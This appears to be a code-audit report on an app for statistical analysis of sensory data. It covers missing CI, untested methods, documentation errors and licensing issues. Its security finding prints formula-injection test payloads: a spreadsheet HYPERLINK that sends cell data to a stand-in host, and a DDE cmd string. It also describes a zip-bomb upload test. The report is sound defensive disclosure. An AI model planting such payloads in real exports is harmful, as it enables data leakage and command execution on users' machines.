### TEST-01: The suite protects results only on the maintainer's machine: no CI, no lockfile, one Python version
- Severity claimed: HIGH
- Location: repo root (`.github/` absent, no lockfile); `requirements.txt`; `pytest.ini`
- Evidence: - `ls .github` returns "No such file". There is no `*.lock`, `constraints.txt` or `pip freeze` output.
  - `requirements.txt` gives floors and major-version caps only: `statsmodels>=0.14.2,<1.0.0`, `scikit-learn>=1.5.0,<2.0.0`, `scipy>=1.13.0,<2.0.0`, `numpy>=2.3.2,<3.0.0`, `pingouin>=0.5.4,<1.0.0`.
  - The only recorded run is on Python 3.14.7 with statsmodels 0.15.0, scikit-learn 1.9.1 and scipy 1.18.1 (00-orientation section 4). The README claims support for Python 3.11 to 3.14.
  - Many numerical pins are version-sensitive:
    - LMM optimiser output: `test_rata_lmm_pin` asserts the sum of LR statistics is `1292.263 ± 1e-3`.
    - KMeans labels and inertia at `random_state=42`.
    - Bootstrap CA ellipses: `default_rng` seeded draws.
    - PLS permutation p-values drawn from `RandomState(seed)`.
    - Excel sheet baselines in `test_export_rata.py` (comment "Recorded from a fresh baseline run").

### TEST-02: Nearly half the shipped statistical methods have no known-answer test
- Severity claimed: HIGH
- Location: coverage matrix above; `validation/README.md` "Not reference-validated (yet)"
- Evidence: every one of these renders results to users and writes them into the Excel export. None has a test that compares against an externally produced number. Their tests either run the function via AppTest and assert only no-exception, wiring or column conventions, or they pin a value FreeSense itself produced:
  - CATA: `run_cata_contrast`, `compute_penalty` (the Welch t machinery is validated only through JAR), `compute_ca_ellipses`, `build_cld_from_mcnemar`, `wilson_ci`.
  - DA/RATA:
    - `multivariate.calculate_pca`, `run_cva`, `calculate_panel_stability`: the matrix labels them "STRUCT only". `calculate_pca` calls sklearn `PCA` directly (`stats/multivariate.py` about line 123); the PrefMap pin covers the separate `compute_pca_scores`.
    - `varimax`: never executed by any test.
    - `contrast.compute_contrast`.
    - Panel-performance discrimination, agreement/RV and scale usage: the sensochoc pins in `test_panel_performance_summary.py` are derived from the current code.
  - DA Type III with unequal replication and no empty cells. The DA pin uses balanced sensochoc, where Type I = II = III, so the Sum-coding Type III path is never distinguished. I checked it by hand (`B05/t3.py`, 8 assessors × 4 products, replication 1 or 3 per cell). FreeSense gives `F_product = 21.246` against the interaction term with df 21. statsmodels `anova_lm(typ=3)` with Sum coding gives MS_Product / MS_Interaction = 21.2455. So it is correct today but unprotected.
  - Liking: `compute_twoway_anova_demo` (the README says it was spot-checked once, but there is no harness), `compute_jar_penalty_long`, `compute_jar_distribution`, and `segmentation.compute_demographic_association` (never executed).
  - PrefMap: `compute_preference_surface`.
  - PLS: jackknife, permutation test and `compute_cv_coefficient_stability`. The only permutation test asserts `p < 0.05` on a synthetic fixture.
  - RATA: the LMM is validated only on DA intensities with no blanks. The RATA-specific zero-filling of unticked cells feeding the LMM is covered only by `test_da_blank_fill.py::test_rata_always_zero_fills`, which checks the fill, not any statistic computed on filled data.

### SEC-01: Excel exports write any text beginning with "=" as a live formula (formula injection)
- Severity claimed: HIGH
- Location: `utils/export.py`, every builder (`generate_excel_report` l.829ff, `generate_da_excel_report` l.631, `generate_liking_excel_report` l.1028 incl. `Demographics` and `Raw_Data`, `generate_fusion_excel_report` l.1664 `Raw_Data`, `generate_prefmap_excel_report`, `generate_cata_excel_report`); root cause is `DataFrame.to_excel(engine='openpyxl')`, which stores any `str` starting with `=` as a formula cell.
- Evidence: `formula_injection.py` (RATA run completes with no exception). Formula cells found per sheet: Results_Table 4, Descriptives_CLD 40, Means_Wide 4, TickingRate_Wide 4, TickingRatePerRep_Wide 4, LMM_ANOVA 2, PostHoc_Pairwise 170, CochransQ 2, Raw_Data 2320. Examples: `Results_Table!E1 = '=HYPERLINK("http://example.invalid/?leak="&A2,"Click")'`, `Means_Wide!C1 = "=cmd|' /C calc'!A0"`, `Descriptives_CLD!B2 = '=2*21'`. Values beginning `@`, `+`, `-` were written as plain strings (openpyxl only treats `=` as a formula), so the xlsx risk is confined to `=`. Output saved as `rata_evil_export.xlsx`.

### SEC-02: No upload size cap and no decompression guard; a 0.3 MB workbook costs 46 s and 475 MB
- Severity claimed: HIGH (hosted multi-user); LOW (local single-user)
- Location: `.streamlit/config.toml` (no `server.maxUploadSize`, so Streamlit's default 200 MB applies; `streamlit.config.get_option('server.maxUploadSize')` returns 200); `core/data.py:8-37` `load_data` and `:41-100` `load_precomputed_means` call `pd.read_excel` / `pd.read_csv` without any size, row or column limit.
- Evidence: `zipbomb.py` produced `compressed 0.30 MB, sheet xml uncompressed 86.0 MB, ratio 290:1`; `parse.py` returned `shape (1000000, 5) 45.9s peak RSS MB 475`. Extrapolating linearly (not run, to spare the shared machine): a 3 MB upload is about 8 minutes and 4.5 GB; the 200 MB cap is far past any server's memory. The resulting frame is also stored in `st.cache_data(max_entries=4)`, so the memory stays held after the session ends.

### SEC-04: Third-party proprietary files are in the git history (XLSTAT tutorial workbook with macros, training slides, a PDF)
- Severity claimed: HIGH (if the GitHub repository is or will become public); presence VERIFIED, licensing status SUSPECTED
- Location: git history only, none in the current tree. `example_data/LIK_tuto_EN.xlsm` (added `acf8ffa` 2026-03-27, removed `01065d1` 2026-04-23); `PLS.pptx` (added `fd50b56`, removed later); `docs/PLS.pdf` (added `1a6d701`, 1.7 MB); also `Rplots.pdf`, `validation/PrefMap/_out/carto_reference.pdf`, `notebooks/pls_validation.ipynb`.
- Evidence: `git show acf8ffa:example_data/LIK_tuto_EN.xlsm` : `docProps/core.xml` creator "Fabien Llobell", 26 worksheets named `XLSTAT_20220318_...`, contains `xl/vbaProject.bin` (92 KB VBA macros). `PLS.pptx` slide text: "XLSTAT PLS set up ... XLSTAT Recommends ...", creator "Gemma", created 2017. `docs/PLS.pdf` provenance not established (no readable metadata). History is pushed to `origin` (`https://github.com/Sesnor-y/FreeSense.git`); repo visibility could not be checked (`gh` not installed).

### REL-01: The GitHub repository is private, so README's clone command and citation URL fail for every user
- Severity claimed: HIGH
- Location: `README.md:45` (`git clone https://github.com/Sesnor-y/FreeSense.git`), `README.md:425` (citation URL)
- Evidence: `curl -o /dev/null -w "%{http_code}" https://github.com/Sesnor-y/FreeSense` -> `404`; the owner page `https://github.com/Sesnor-y` -> `200`; `GIT_TERMINAL_PROMPT=0 git -c credential.helper= ls-remote https://github.com/Sesnor-y/FreeSense.git` -> `fatal: could not read Username`. `api.github.com/repos/Sesnor-y/FreeSense` -> 404. Authenticated `git ls-remote origin` works, so the repository exists and is private (Inferred; a deleted repo would fail authenticated too).

### REL-02: Git history contains third-party copyrighted files; making the repo public as-is would redistribute them
- Severity claimed: HIGH (becomes BLOCKER if the repository, or a clone with history, is made public)
- Location: history only. `git log --all --diff-filter=A --name-only` lists `example_data/LIK_tuto_EN.xlsm`, `PLS.pptx`, `docs/PLS.pdf`, plus build artefacts `Rplots.pdf`, `validation/PrefMap/_out/carto_reference.pdf`. Commits touching them include `acf8ffa`, `1a6d701`, `01065d1`, `a6b5d33`, `fd50b56`, `bbd91e2`. B07 identifies the first two as XLSTAT (Addinsoft) tutorial material, the `.xlsm` with VBA macros.
- Evidence: see B07 for provenance. From the licensing side: none of these files is covered by the repo's MIT `LICENSE`, and no licence or permission notice for them exists anywhere in history I could find (`git ls-files` shows no NOTICE/COPYING file at any point).

### REL-03: pingouin (GPL-3.0) is installed by default and imported by the MIT-licensed app; licence position undocumented
- Severity claimed: HIGH (licensing decision needed before release; not a technical defect)
- Location: `requirements.txt:11` (`pingouin>=0.5.4,<1.0.0`, installed by default), `stats/panel_performance.py:21-25` (`try: import pingouin as pg`), used only at `stats/panel_performance.py:252-264` (`pg.intraclass_corr(...)` for the ICC3 95% CI columns `ICC_lower_approx`/`ICC_upper_approx`); README "License" section (`README.md:429-452`) mentions only the GPL datasets.
- Evidence: `importlib.metadata` reports `pingouin 0.6.1 | GPL-3.0`. It is the only copyleft package among ~65 installed distributions (others are MIT, BSD, Apache-2.0, PSF, MPL-2.0 for `certifi`; full list in the scratch output). pingouin also pulls seaborn, xarray, pandas-flavor, tabulate, which no FreeSense code imports. With pingouin uninstalled the app imports, the panel-performance and validation-pin tests pass (19 passed) and the DA AppTest file runs clean, so the "optional" claim in README line 72 holds.
- What this implies (common interpretation, not a legal conclusion):
  - **Source distribution (git clone + pip install):** FreeSense's own files do not contain pingouin code, and the user installs pingouin themselves from PyPI. The FSF's position is that a program that imports a GPL library and runs as one process forms a combined work that must be distributed under GPL-compatible terms as a whole; MIT *is* GPL-compatible, so MIT-licensed source that imports GPL-3.0 is generally considered fine to publish. The practical consequence is that anyone distributing the *combination* must honour GPL-3.0 for it, and the MIT grant does not let recipients close it. Many projects accept this; some institutions' policies do not.
  - **Hosted service (Streamlit Cloud, institutional server):** GPL-3.0 (unlike AGPL) is triggered by distribution, not by network use. Running FreeSense with pingouin for remote users is generally not "conveying" and imposes no source-offer obligation.
  - **Bundled binary (Docker image, PyInstaller, a university software share):** this *is* distribution of pingouin. The distributor must include the GPL-3.0 text, pingouin's source or a written offer for it, and must not impose terms that restrict the combined work beyond GPL-3.0. An MIT label on the image would be misleading about the combined work.

### DOC-01: Statistical methods reference contradicts the implemented code in places a user would copy into a methods section
- Severity claimed: HIGH
- Location: `Statistical_Methods_README.md` sections 8, 15, 16, 23a, 23c, 24, 27, 48, 51
- Evidence (each checked against the code):
  1. §16 "FDR and LSD in the DA context" (lines 843-855) says n_i, n_j in the pairwise SE are "the number of assessors (unique, not observations)" and that using observation counts "inflat[es] false positive rates". The code does the opposite: `stats/posthoc.py:144-157` `_observation_counts` returns `groupby(product).size()` (J x R), and its docstring says `nunique(assessor)` would be wrong. §5a (line 269) describes the code correctly, so the document contradicts itself. §23a (line 1283) repeats the stale "number of unique assessors" for the DA contrast SE, while `stats/contrast.py:424-425,706-707` uses `_observation_counts`.
  2. §23c "Note on family size" (lines 1323-1324) says the contrast BH family is only the selected comparison products. `stats/contrast.py:578-610` corrects over the full C(n,2) pair family (B.23 / F-03), as README line 267 and §25 say.
  3. §24 "Why ML, not REML" (lines 1449-1451) says the Liking LMM is fitted by ML. `stats/liking.py:228-246` fits REML for the LS means and their covariance and ML only for the LRT (the module docstring, lines 9-13, and README line 255 agree with the code).
  4. §24 has a heading "Satterthwaite Degrees of Freedom" (line 1459) for `df = n_consumers - n_products`, which is not a Satterthwaite approximation (the code also names it `df_satterthwaite`, `stats/liking.py:705`). A user reporting "Satterthwaite df" would misreport.
  5. §8 "Missing-cell caveat" (line 356) says PCA/CVA pivots use `fillna(0)` in `stats/multivariate.py`. `grep -n fillna stats/multivariate.py` returns nothing. The current behaviour (leave incomplete attributes out and say so) is in CHANGELOG `[Unreleased]` and CLAUDE.md.
  6. §15 formula blocks (lines 687-689, 698-700) show `intensity ~ C(Product) + C(Assessor)` (treatment coding). The code uses `C(Prod_Safe, Sum)` (`stats/da_anova.py:224, 292`).
  7. §15 (line 710) calls Type III with effect coding "the recommended convention in Langsrud (2003)". Langsrud (2003) is titled "Use Type II instead of Type III sums of squares"; the reference note at line 817 admits FreeSense departs from it. The body text misattributes the recommendation.
  8. §51 (lines 2691, 2712) says CA bootstrap default B = 200 and "increase to 1000+ for publication graphics", and line 2711 mentions "ellipse-confidence sliders". The app hard-codes 500 resamples, seed 42, confidence 0.95 (`modules/cata/ui.py:2157-2158, 2340-2342`; `stats/cata.py` docstring "n_boot : int, default 500"). The user cannot change any of them.
  9. §27 "Test Selection Logic" (line 1647) says the permutation test uses 10,000 permutations. `stats/segmentation.py:24` `DEFAULT_PERMUTATION_N = 999`, and the only caller (`modules/liking/workflow.py:1253`) does not override it. The k-means `random_state=42` is not documented (only `n_init=50`).
  10. §48 (line 2593) lists correction methods "BH (default), BY, Bonferroni, and Holm". The UI offers `["FDR (Benjamini-Hochberg)", "Bonferroni", "Holm", "Uncorrected"]` (`modules/cata/ui.py:118`): no BY, and "Uncorrected" is not documented.
- Evidence: 

### DOC-02: No ready-to-use methods text or per-module citation, and exports do not carry what a methods section needs
- Severity claimed: HIGH
- Location: `README.md:421-425` (Citation); `utils/export.py:334-560` (`build_run_parameters_sheet`); `Methods_Notes` writers at `utils/export.py:272` (RATA) and `2085` (CATA)
- Evidence: A grep of README and the methods reference for "cite", "methods section" and "reporting" finds only the single software citation "Danner, L. (2026). FreeSense ... (Version 1.0) [Software]", with no DOI, no `CITATION.cff` and no archived release. No module has a template paragraph (model, SS type, error term, post-hoc and correction family, software and version). A `Methods_Notes` sheet exists only for RATA and CATA. DA, Liking, Fusion and PrefMap have only `Run_Parameters`. `Run_Parameters` records `freesense_version` (`1.0.0`, which is also the tag on a commit 146 commits older, per 00-orientation flag 4) but no versions of statsmodels, scipy, scikit-learn or pingouin, which set the numerical engine.

